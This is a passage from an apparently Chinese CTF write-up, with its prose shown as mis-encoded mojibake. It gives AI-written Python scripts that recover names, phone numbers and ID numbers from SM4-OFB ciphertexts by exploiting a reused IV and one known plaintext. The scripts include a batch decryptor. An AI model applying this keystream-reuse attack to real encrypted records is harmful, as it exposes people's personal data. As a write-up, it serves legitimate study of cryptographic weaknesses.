</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">hundreds</span> <span class="o">=</span> <span class="n">bin_to_int</span><span class="p">(</span><span class="n">bin_chunk</span><span class="p">.</span><span class="n">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">tens</span>     <span class="o">=</span> <span class="n">bin_to_int</span><span class="p">(</span><span class="n">bin_chunk</span><span class="p">.</span><span class="n">substr</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">units</span>    <span class="o">=</span> <span class="n">bin_to_int</span><span class="p">(</span><span class="n">bin_chunk</span><span class="p">.</span><span class="n">substr</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">4</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">ascii_value</span> <span class="o">=</span> <span class="n">hundreds</span> <span class="o">*</span> <span class="mi">100</span> <span class="o">+</span> <span class="n">tens</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">+</span> <span class="n">units</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">(</span><span class="n">ascii_value</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="n">a</span> <span class="o">=</span> <span class="s">&#34;000001101000000001100101000010000011000001100111000010000100000001110000000100100011000100100000000001100111000100010111000001100110000100000101000001110000000010001001000100010100000001000101000100010111000001010011000010010111000010000000000001010000000001000101000010000001000100000110000100010101000100010010000001110101000100000111000001000101000100010100000100000100000001001000000001110110000001111001000001000101000100011001000001010111000010000111000010010000000001010110000001101000000100000001000010000011000100100101&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">decodeBinaryString</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œï¼Œå¾—åˆ°Flagï¼š<code>DASCTF{xCuBiFYr-u5aP2-QjspKk-rh0LO-w9WZ8DeS}</code></p>
<h2 id="ds">DS
</h2><h3 id="sm4-ofb">SM4-OFB
</h3><p>è®©AIåˆ†æä¸€ä¸‹åŠ å¯†è¿‡ç¨‹å¹¶ç¼–å†™è§£å¯†è„šæœ¬ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span><span class="lnt">96
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># ä½¿ç”¨æ­¤ä»£ç è¿›è¡Œæœ¬åœ°è¿è¡Œæˆ–åœ¨æœ¬ç¯å¢ƒè¿è¡Œæ¥æ¢å¤å¯†æ–‡ï¼ˆSM4-OFB å‡è®¾ä¸‹ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ä»£ç ä¼šï¼š</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 1) ä½¿ç”¨å·²çŸ¥ record1 çš„æ˜æ–‡å’Œå¯†æ–‡è®¡ç®—æ¯ä¸ªåˆ†å—çš„ keystreamï¼ˆå‡è®¾ä½¿ç”¨ PKCS#7 å¡«å……åˆ° 16 å­—èŠ‚å¹¶ä¸”æ¯ä¸ªå­—æ®µå•ç‹¬ä»¥ OFB ä»ç›¸åŒ IV å¼€å§‹ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 2) ç”¨å¾—åˆ°çš„ keystream å»è§£ record2 å¯¹åº”å­—æ®µçš„å¯†æ–‡ï¼Œå°è¯•å»æ‰å¡«å……å¹¶è¾“å‡ºæ˜æ–‡ï¼ˆUTF-8 è§£ç ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># è¯´æ˜ï¼šæ­¤è„šæœ¬**ä¸éœ€è¦å¯†é’¥**ï¼Œåªåˆ©ç”¨äº†å·²çŸ¥æ˜æ–‡ä¸ç›¸åŒ IV/æ¨¡å¼å¤ç”¨å¯¼è‡´çš„ keystream å¯é‡ç”¨æ€§ï¼ˆè¿™æ˜¯ OFB/CTR çš„å…¸å‹å¼±ç‚¹ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># è¯·ç¡®ä¿å®‰è£… pycryptodomeï¼ˆå¦‚æœéœ€è¦å¯¹ç…§åŠ å¯†è¿›è¡ŒéªŒè¯ï¼‰ï¼Œä½†æ­¤è„šæœ¬åªåšå¼‚æˆ–æ“ä½œï¼Œä¸è°ƒç”¨åŠ å¯†åº“ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span><span class="p">,</span> <span class="n">hexlify</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span><span class="p">,</span> <span class="n">unpad</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xor_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># record1 å·²çŸ¥æ˜æ–‡ä¸å¯†æ–‡ï¼ˆç”¨æˆ·æä¾›ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">record1</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;name_plain&#34;</span><span class="p">:</span> <span class="s2">&#34;è’‹å®ç²&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;name_cipher_hex&#34;</span><span class="p">:</span> <span class="s2">&#34;cef18c919f99f9ea19905245fae9574e&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;phone_plain&#34;</span><span class="p">:</span> <span class="s2">&#34;17145949399&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;phone_cipher_hex&#34;</span><span class="p">:</span> <span class="s2">&#34;17543640042f2a5d98ae6c47f8eb554c&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;id_plain&#34;</span><span class="p">:</span> <span class="s2">&#34;220000197309078766&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;id_cipher_hex&#34;</span><span class="p">:</span> <span class="s2">&#34;1451374401262f5d9ca4657bcdd9687eac8baace87de269e6659fdbc1f3ea41c&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;iv_hex&#34;</span><span class="p">:</span> <span class="s2">&#34;6162636465666768696a6b6c6d6e6f70&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># record2 ä»…å¯†æ–‡ï¼ˆç”¨æˆ·æä¾›ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">record2</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;name_cipher_hex&#34;</span><span class="p">:</span> <span class="s2">&#34;c0ffb69293b0146ea19d5f48f7e45a43&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;phone_cipher_hex&#34;</span><span class="p">:</span> <span class="s2">&#34;175533440427265293a16447f8eb554c&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;id_cipher_hex&#34;</span><span class="p">:</span> <span class="s2">&#34;1751374401262f5d9ca36576ccde617fad8baace87de269e6659fdbc1f3ea41c&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;iv_hex&#34;</span><span class="p">:</span> <span class="s2">&#34;6162636465666768696a6b6c6d6e6f70&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BS</span> <span class="o">=</span> <span class="mi">16</span>  <span class="c1"># åˆ†ç»„é•¿åº¦</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å·¥å…·ï¼šæŠŠå­—æ®µæŒ‰ 16 å­—èŠ‚å—åˆ‡åˆ†</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">split_blocks</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">BS</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">),</span> <span class="n">BS</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 1) è®¡ç®— record1 æ¯ä¸ªå­—æ®µçš„ keystreamï¼ˆå‡è®¾åŠ å¯†å‰ç”¨ PKCS#7 å¡«å……ï¼Œç„¶åæŒ‰å— XORï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">ks_blocks</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="p">[],</span> <span class="s2">&#34;phone&#34;</span><span class="p">:</span> <span class="p">[],</span> <span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="p">[]}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># name</span>
</span></span><span class="line"><span class="cl"><span class="n">C_name</span> <span class="o">=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">record1</span><span class="p">[</span><span class="s2">&#34;name_cipher_hex&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">P_name_padded</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">record1</span><span class="p">[</span><span class="s2">&#34;name_plain&#34;</span><span class="p">],</span> <span class="n">BS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">c</span><span class="p">,</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">split_blocks</span><span class="p">(</span><span class="n">C_name</span><span class="p">),</span> <span class="n">split_blocks</span><span class="p">(</span><span class="n">P_name_padded</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ks_blocks</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">xor_bytes</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">p</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># phone</span>
</span></span><span class="line"><span class="cl"><span class="n">C_phone</span> <span class="o">=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">record1</span><span class="p">[</span><span class="s2">&#34;phone_cipher_hex&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">P_phone_padded</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">record1</span><span class="p">[</span><span class="s2">&#34;phone_plain&#34;</span><span class="p">],</span> <span class="n">BS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">c</span><span class="p">,</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">split_blocks</span><span class="p">(</span><span class="n">C_phone</span><span class="p">),</span> <span class="n">split_blocks</span><span class="p">(</span><span class="n">P_phone_padded</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ks_blocks</span><span class="p">[</span><span class="s2">&#34;phone&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">xor_bytes</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">p</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># id (å¯èƒ½ä¸ºä¸¤å—)</span>
</span></span><span class="line"><span class="cl"><span class="n">C_id</span> <span class="o">=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">record1</span><span class="p">[</span><span class="s2">&#34;id_cipher_hex&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">P_id_padded</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">record1</span><span class="p">[</span><span class="s2">&#34;id_plain&#34;</span><span class="p">],</span> <span class="n">BS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">c</span><span class="p">,</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">split_blocks</span><span class="p">(</span><span class="n">C_id</span><span class="p">),</span> <span class="n">split_blocks</span><span class="p">(</span><span class="n">P_id_padded</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ks_blocks</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">xor_bytes</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">p</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Derived keystream blocks (hex):&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">field</span><span class="p">,</span> <span class="n">blks</span> <span class="ow">in</span> <span class="n">ks_blocks</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">field</span><span class="p">,</span> <span class="p">[</span><span class="n">b</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">blks</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 2) ä½¿ç”¨ä¸Šè¿° keystream å»è§£ record2 ç›¸åº”å­—æ®µ</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recover_field</span><span class="p">(</span><span class="n">cipher_hex</span><span class="p">,</span> <span class="n">ks_list</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">C</span> <span class="o">=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">cipher_hex</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">blocks</span> <span class="o">=</span> <span class="n">split_blocks</span><span class="p">(</span><span class="n">C</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recovered_padded</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">xor_bytes</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">ks</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span><span class="p">,</span> <span class="n">ks</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">blocks</span><span class="p">,</span> <span class="n">ks_list</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å°è¯•å»é™¤å¡«å……å¹¶è§£ç </span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">recovered</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">recovered_padded</span><span class="p">,</span> <span class="n">BS</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">recovered</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">recovered</span><span class="p">,</span> <span class="n">recovered_padded</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">name_rec</span><span class="p">,</span> <span class="n">name_padded</span> <span class="o">=</span> <span class="n">recover_field</span><span class="p">(</span><span class="n">record2</span><span class="p">[</span><span class="s2">&#34;name_cipher_hex&#34;</span><span class="p">],</span> <span class="n">ks_blocks</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">phone_rec</span><span class="p">,</span> <span class="n">phone_padded</span> <span class="o">=</span> <span class="n">recover_field</span><span class="p">(</span><span class="n">record2</span><span class="p">[</span><span class="s2">&#34;phone_cipher_hex&#34;</span><span class="p">],</span> <span class="n">ks_blocks</span><span class="p">[</span><span class="s2">&#34;phone&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">id_rec</span><span class="p">,</span> <span class="n">id_padded</span> <span class="o">=</span> <span class="n">recover_field</span><span class="p">(</span><span class="n">record2</span><span class="p">[</span><span class="s2">&#34;id_cipher_hex&#34;</span><span class="p">],</span> <span class="n">ks_blocks</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Recovered (if OFB with same IV/key and per-field restart):&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Name padded bytes (hex):&#34;</span><span class="p">,</span> <span class="n">name_padded</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Name plaintext:&#34;</span><span class="p">,</span> <span class="n">name_rec</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Phone padded bytes (hex):&#34;</span><span class="p">,</span> <span class="n">phone_padded</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Phone plaintext:&#34;</span><span class="p">,</span> <span class="n">phone_rec</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ID padded bytes (hex):&#34;</span><span class="p">,</span> <span class="n">id_padded</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ID plaintext:&#34;</span><span class="p">,</span> <span class="n">id_rec</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å¦‚æœè§£ç å¤±è´¥ï¼Œæ‰“å°åŸå§‹ bytes ä»¥ä¾¿äººå·¥åˆ†æ</span>
</span></span><span class="line"><span class="cl"><span class="c1"># if name_rec is None:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     print(&#34;\nName padded bytes (raw):&#34;, name_padded)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># if phone_rec is None:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     print(&#34;Phone padded bytes (raw):&#34;, phone_padded)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># if id_rec is None:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     print(&#34;ID padded bytes (raw):&#34;, id_padded)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ç»“æŸ</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‘ç°èƒ½å¤Ÿè®¡ç®—å¾—åˆ°å§“åå’Œèº«ä»½è¯å·ï¼Œå†å°†Excelè¡¨ä¸­æ‰€æœ‰äººådumpå‡ºæ¥æ”¾åˆ°txté‡Œï¼Œè®©AIå†™ä¸ªè„šæœ¬æ‰¹é‡è®¡ç®—ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">Batch-decrypt names encrypted with SM4-OFB where the same IV/nonce was reused and
</span></span></span><span class="line"><span class="cl"><span class="s2">one known plaintext/ciphertext pair is available (from record1).
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">This script:
</span></span></span><span class="line"><span class="cl"><span class="s2"> - Reads an input file (one hex-encoded cipher per line).
</span></span></span><span class="line"><span class="cl"><span class="s2"> - Uses the known record1 name plaintext &amp; ciphertext to derive the OFB keystream
</span></span></span><span class="line"><span class="cl"><span class="s2">   blocks for the name-field (keystream = C XOR P_padded).
</span></span></span><span class="line"><span class="cl"><span class="s2"> - XORs each input cipher with the derived keystream blocks to recover plaintext,
</span></span></span><span class="line"><span class="cl"><span class="s2">   removes PKCS#7 padding if present, and prints a line containing:
</span></span></span><span class="line"><span class="cl"><span class="s2">       &lt;recovered_name&gt;</span><span class="se">\t</span><span class="s2">&lt;cipher_hex&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Usage:
</span></span></span><span class="line"><span class="cl"><span class="s2">    python3 sm4_ofb_batch_decrypt_names.py names_cipher.txt
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Notes:
</span></span></span><span class="line"><span class="cl"><span class="s2"> - This assumes each name was encrypted as a separate field starting OFB from
</span></span></span><span class="line"><span class="cl"><span class="s2">   the same IV (so keystream blocks align for the name-field) and PKCS#7 padding
</span></span></span><span class="line"><span class="cl"><span class="s2">   was used before encryption. If names exceed the number of derived keystream
</span></span></span><span class="line"><span class="cl"><span class="s2">   blocks the script will attempt to reuse the keystream cyclically (warns about it),
